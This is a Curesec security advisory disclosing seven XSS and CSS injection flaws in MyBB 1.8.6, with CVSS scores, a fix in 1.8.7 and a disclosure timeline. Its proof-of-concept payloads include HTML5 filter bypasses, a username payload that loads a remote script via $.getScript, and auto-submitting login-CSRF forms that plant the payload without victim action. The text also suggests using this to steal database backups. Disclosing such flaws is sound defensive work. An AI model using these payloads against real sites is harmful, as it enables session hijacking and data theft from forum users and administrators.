@@ -1,0 +1,227 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    MyBB 1.8.6
+Fixed in:            1.8.7
+Fixed Version Link:  http://resources.mybb.com/downloads/mybb_1807.zip
+Vendor Website:      http://www.mybb.com/
+Vulnerability Type:  XSS
+Remote Exploitable:  Yes
+Reported to vendor:  01/29/2016
+Disclosed to public: 09/15/2016
+Release mode:        Coordinated Release
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+MyBB is forum software written in PHP. In version 1.8.6, it contains various
+XSS vulnerabilities, some of which are reflected and some of which are
+persistent. Some of them depend on custom forum or server settings.
+
+These issues may lead to the injection of JavaScript keyloggers, injection of
+content such as ads, or the bypassing of CSRF protection, which would for
+example allow the creation of a new admin user.
+
+3. Details
+
+XSS 1: Persistent XSS - Signature
+
+CVSS: Medium 5.0 AV:N/AC:L/Au:N/C:N/I:P/A:N
+
+Description: The profile editor of the moderator control panel does not
+properly encode the signature of a user when editing it. Because of this, a
+user can create a specifically crafted signature and - once a moderator or
+admin visits the profile editor for that user - the injected code will be
+executed in the context of the victims browser.
+
+Proof of Concept:
+
+Visit the profile at: http://localhost/mybb_1806/Upload/modcp.php?action=editprofile&uid=[USER_ID] As signature, use: </textarea><img src=no onerror=alert(1)>
+
+XSS 2: Persistent XSS - Forum Post (depending on forum settings)
+
+CVSS: Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description: An admin can allow HTML input for specific forums via the setting
+allowhtml. There are various filters in place which intend to make this safe,
+which may leave the admin with the impression that it is indeed safe. However,
+there are various possibilities to bypass these filters, mainly using HTML5
+features.
+
+Proof of Concept:
+
+<body onpageshow=alert(1)> -> Visiting the post will trigger the code <div
+contextmenu="mymenu" oncontextmenu=alert(1)>context menu</pre> -> A right-click
+will trigger the code <form action=""> Enter something: <input type="text" name
+="myinput" oninput="alert(1)"><br> <input type="submit" value="Submit"> </form>
+-> Input into the field will trigger the code <form action=""> <input type=
+"text" name="myinput" oninvalid="alert(1)" required> <input type="submit" value
+="Submit"> </form> -> A click on submit will trigger the code
+
+There are various other attributes which may also work, such as onsearch,
+onkeydown, onkeyup, ondrag, onscroll, oncopy, and so on. Other attributes such
+as onMouseOver or onFocus are filtered out.
+
+XSS 3: Persistent XSS - Username (depending on forum settings)
+
+CVSS: Low 2.6 AV:N/AC:H/Au:N/C:N/I:P/A:N
+
+Description: The username is echoed unencoded in the user area. As the login
+does not have CSRF protection and as an admin can be logged into the admin area
+with a different account than the one they are logged into the forum, a
+persistent XSS vulnerability in the user area can be exploited. However,
+successful exploitation most likely requires a username length of at least 43
+characters, which is more than the default settings allow.
+
+Simple Proof of Concept:
+
+1. register user with name f" onmouseover="alert(1)" b=" 2. login and visit
+http://localhost/mybb_1805/Upload/usercp.php 3. hover over the avatar
+
+The simple proof of concept can be improved to allow successful exploitation.
+It is not required for the victim to hover over the avatar or interact with the
+webpage in any way:
+
+1. As username, use: f" onerror="alert(1)" b=" 2. Set an avatar, and use a URL
+as source (not an image upload) 3. Delete the image from the remote host,
+making it unavailable, thus triggering an error and executing the injected
+code.
+
+Possible Payloads:
+
+Loading a script with vanilla javascript takes a lot more characters than are
+allowed in a username by default:
+
+"onerror="s=document.createElement('script');s.src='http://localhost/s.js';
+document.getElementById('top').appendChild(s)"
+
+As jQuery is loaded, this can be optimized:
+
+"onerror="$.getScript('http://aa.bc/s.js')
+
+Executing the payload for a victim:
+
+The attack does not require the victim to not be logged in as normal user, as
+one can login even when already logged in. The login as a normal user also does
+not affect the login as admin. Thus, an attacker could use the following
+payload to log a victim in and redirect them to the site containing the
+payload:
+
+<iframe id="myframe" style="display: none" name="myframe" src="about:blank"></
+iframe> <form method="post" action="http://localhost/mybb_1805/Upload/
+member.php" target="myframe" id="myform" name="myform"> <input name="action"
+type="hidden" value="do_login" /> <input name="url" type="hidden" value="http:/
+/localhost/mybb_1805/Upload/usercp.php" /> <input name="quick_login" type=
+"hidden" value="1" /> <input name="quick_username" type="hidden" value=
+""onerror="$.getScript('http://localhost/s.js')" /> <input name=
+"quick_password" type="hidden" value="123456" /> <input name="quick_remember"
+type="hidden" value="yes" /> </form> <script>document.myform.submit();</script>
+
+It will automatically log the victim in and redirect them to the page that
+triggers the script execution. No action of the victim is required. The loaded
+script could for example perform a backup of the database and then send the
+attacker the name of the backup, as backups are stored in a public directory.
+
+XSS 4: Persistent XSS - Post Attachment (depending on server settings)
+
+CVSS: Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description: Attachments are uploaded to a public directory, and their
+extension is changed to .attach. Files with extension .attach that contain HTML
+code are interpreted as HTML files by some default server configurations (for
+example Apache). Additionally, the directory where the files are uploaded to
+does not prevent directory listing via an index.html file as all the other
+directories of MyBB do. Because of this, an attacker can find the name of the
+file and send it to a victim. Once the victim visits the link, the JavaScript
+code in the file would execute.
+
+Proof of Concept:
+
+1. upload HTML file containing <html><body><script>alert(1);</script></body></
+html> 2. find file located at /mybb_1805/Upload/uploads/YYYMM/
+RANDOM_STRING.attach. The YYYMM directory is not protected against directory
+browsing via an index.php or index.html file like most other directories of
+MyBB, which means depending on the server configuration, the file can easily be
+found 3. send admin there
+
+XSS 5: Reflected XSS - Account Activation
+
+CVSS: Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description: The account activation form echoes a given code unencoded to the
+user, resulting in reflected XSS.
+
+Proof of Concept:
+
+http://localhost/mybb_1806/Upload/member.php?action=activate&uid=-1&code=">
+<script>alert(1)<%2fscript>
+
+XSS 6: Reflected XSS - Update (depending on locked state)
+
+CVSS: Low 2.6 AV:N/AC:H/Au:N/C:N/I:P/A:N
+
+Description: In many of the update scripts, POST values are echoed without
+proper encoding. The scripts are upgrade3.php, upgrade12.php, upgrade13.php,
+upgrade17.php, and upgrade30.php. As this attack only works when the forum is
+disabled, the forum itself cannot be attacked, but the attack could be used to
+attack other software hosted on the same domain.
+
+Proof of Concept:
+
+<form id="myForm" action="http://localhost/mybb_1805/Upload/install/
+upgrade.php" method="POST"> <input name="action" value="30_dbchanges_ip">
+<input name="iptask" value="5"> <input name="iptable" value="7"> <input name=
+"ipstart" value="<script>alert(1)</script>"> <input type="submit" value=
+"Submit"> </form> <script> document.getElementById("myForm").submit(); </
+script>
+
+XSS 7: Reflected CSS Injection
+
+CVSS: Low 2.6 AV:N/AC:H/Au:N/C:N/I:P/A:N
+
+Description: When displaying an error, MyBB echoes user input in a style
+context, allowing an attacker to inject CSS. With this, it may be possible to
+change the look of the website or extract information, and it may lead to XSS
+in older browsers.
+
+Proof of Concept:
+
+This script submits a search, which will trigger an SQL error because of the
+non-existing author. All it does then is change the background color of the
+error report to black to show the existence of the injection:
+
+<form id="myForm" action="http://localhost/mybb_1805/Upload/search.php/) ; }
+%23error { background: %23000000; } /*" method="POST"> <input name="action"
+value="do_search"> <input name="author" value="nonexistentauthor"> <input name=
+"matchusername" value="1"> </form> <script> document.getElementById
+("myForm").submit(); </script>
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 1.8.7:
+
+http://resources.mybb.com/downloads/mybb_1807.zip
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+01/29/2016 Informed Vendor about Issue
+02/26/2016 Vendor requests more time
+03/11/2016 Vendor releases fix
+09/15/2016 Disclosed to public
+
+
+Blog Reference:
+https://www.curesec.com/blog/article/blog/MyBB-186-XSS-160.html
+ 
+--
+blog:  https://www.curesec.com/blog
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Josef-Orlopp-Straße 54
+10365 Berlin, Germany
